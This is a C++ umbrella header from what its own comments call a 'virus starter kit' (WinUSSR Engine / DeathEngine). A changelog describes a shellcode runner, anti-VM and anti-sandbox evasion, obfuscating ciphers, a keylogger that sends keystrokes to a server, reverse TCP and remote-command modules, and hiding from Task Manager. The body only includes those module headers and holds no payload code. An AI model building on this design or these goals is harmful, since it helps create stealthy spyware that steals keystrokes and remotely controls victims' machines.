#pragma once

/*
*		This is a much cleaner implementation of the WinUSSR Engine into DeathEngine.
*	I just realized that I could just do this and basically make my old engine and my
*	new engine undetected if I did this. lmao.
*
*		I have made a good beginner's guide to a virus starter kit. It runs shell code
*	it encrypts, it decrypts, it's hardened against Virtual Machines and sandboxes. All
*	I need now is to be able to make it a metric pain in the ass to reverse engineer and
*	possibly bust VM's harder than most other programs.
*
*		If I tried I could go even further and make some shit designed to handle multiple
*	shell code pieces then do some shit with like other stuff but for now I'm good with
*	the shit I have right now. If it works, I won't bother trying to change it for now.
*
*		There's been an implementation of new TCP Modules as well as a (disfunctional)
*	reverse tcp module as well as an actual implementation of some other modules that I
*	have been lacking on implementing for a while now.
*
*		There will be a point where I may look into cryptography a bit more and add more
*	than just my standard encryption/decryption modules and maybe actually create a fully
*	functional polymorphic cipher module.
*
*		(2022-09-19 - 2022-09-25: UPDATE): This has mostly been code refactoring however, it's mostly
*	to do with naming conventions. There has been some huge overhauls to how the TCP mode works though.
*	Added new commands, finished up some old ones, fixing some broken ones, etc. Not to mention how the
*	keylogger, app command handler & net object classes work in general (including the children)! The interaction
*	between the server and the user is no longer painfully slow when testing it out on a loopback device due to
*	some thread usage optimization, as well as decreasing memory usage. Added keybuffer, changed KeyLogger to Keyboard,
*	changed some comments, removed some comments, general code maintenence, added the ability to disable all keyboard messages
*	as well as log the keys that are being pressed, added the ability to send keylogs to server from client. Hopefully, all of
*	the features I added works.
*
*
*		(2022-10-05: UPDATE): Reworking how the ciphers are just in general, I don't like their implementation, it was sloppy,
*	unfinished and just not good. I can do better than that garbage, I will do better than that. It may take some time however,
*	it will be worth it to see the final product be something I'm proud of rather than some garbage that 15 year old me cooked up
*	at 10:00 in the morning. Will probably take a week or two to figure this one's implementation out however, it can possibly be
*	done. A couple functions, some key reworks, etc. Just need a good model of what I want it to be for now though since it's just
*	been completely removed for now. A lot of it was made on old assumptions I made about how the compiler worked. It's all been
*	excluded from the project. re-include slowly when possible. Tackle it one at a time starting with the head one.
*
*
*		(2022-10-09: UPDATE): Reworking how the keylogger works, instead of using a keyboard hook dedicated to just keylogging,
*	it's an all purpose keyboard hook class that gets it's functionality from callback functions (OnKeyPressed & OnKeyReleased)
*	so that the user may define how it works. The client class will just use the keybuffer class as a means of storing all the
*	keystrokes that are picked up by the keyboard, which then will be sent to the server if toggled on. Added a way to create a
*	gui so that the server can run input, display output, as well as many other functions that will be worked on in the future.
*	Added a way for WinMain applications to be closed via keyboard input.
* 
*		(2022-11-15: UPDATE): WinUSSR Engine will become it's own static library that will be independent from
*	WinUSSR DeathEngine. DeathEngine/DeathEngine2  is the gui extension of WinUSSR Engine and as  such should be
*	seperate from the core of WinUSSREngine. This allows for more tool varitey as well as allows for commandline
*	support for WinUSSR Engine without having to rewrite the software 800,000,000 times. This also gives developers
*	working with WinUSSR Engine the ability to create variants of WinUSSR Engine for other platforms. Let's be honest,
*	I am the only one who uses it but if on the rare occasion I decide to post to github, other people can then use it
*	without DeathEngine2 which is nice I guess. It also allows people to add modules to WinUSSR Engine without having
*	to create a test ui app then if they wanna use it, have to figure out some half assed solution to the problem of
*	task manager being able to detect the program.
* 
*		(2022-11-17: UPDATE): WinUSSR Engine has added application engine style structure to it while steering clear of
*	defining an entry point as well as a "CreateApp" function within the program it's self. If other programmers wish 
*	to, they can define it themselves the way they see fit. It is just so that it makes the library easier to use as well
*	as keeps it as open as possible still. Without a predefined entry point, anyone can create one in their own project and
*	have their windows messages still work. How well this will work with other app frameworks that encorperate the same 
*	structure will be left for testing. Havent removed the original files from the main project since if this becomes a disaster,
*	I can always have this be it's own project and figure out a solution that will work with this style. For now, all is well.
*	The new cipher implementation is one I am genuinely happy with. It works amazingly for it's purpose of being generally 
*	speaking a bitch to reverse engineer but also allows for me to do some great shit with it. I will go over and also edit
*	the decryption so that it works as intended (reverse order of adding).
*/

//-------------------Base-----------------------------
#include "WinUSSREngine/Base/Base.h"
#include "WinUSSREngine/Base/Application.h"
#include "WinUSSREngine/Base/Layer.h"
//----------------------------------------------------

//-------------------Cryptology Modules---------------
#include "WinUSSREngine/Cryptology/CipherModule.h"
#include "WinUSSREngine/Cryptology/VigenereModule.h"
#include "WinUSSREngine/Cryptology/XorModule.h"
#include "WinUSSREngine/Cryptology/Ciphers.h"
//----------------------------------------------------

//--------------------Evasion Modules-----------------
#include "WinUSSREngine/Evasion/AntiSandbox.h"
#include "WinUSSREngine/Evasion/AntiVirtualMachine.h"
//----------------------------------------------------

//-------------------Miscelaneous Modules-------------
#include "WinUSSREngine/Base/Logfile.h"
#include "WinUSSREngine/Base/Config.h"
//----------------------------------------------------

//--------------------TCP Tool Modules----------------
#include "WinUSSREngine/Network/ServerTCP.h"
#include "WinUSSREngine/Network/ClientTCP.h"
//----------------------------------------------------

//-------------------Shellcode Modules----------------
#include "WinUSSREngine/Shellcode/Shellcode.h"
#include "WinUSSREngine/Shellcode/ShellExec.h"
//----------------------------------------------------

//-------------------Windows only Modules-------------
#include "WinUSSREngine/Windows/Keyboard.h"
#include "WinUSSREngine/Windows/Mouse.h"
#include "WinUSSREngine/Windows/RemoteCmd.h"
//----------------------------------------------------

//-------------------Utility & Obfuscation------------
#include "WinUSSREngine/Base/StringTools.h"
//----------------------------------------------------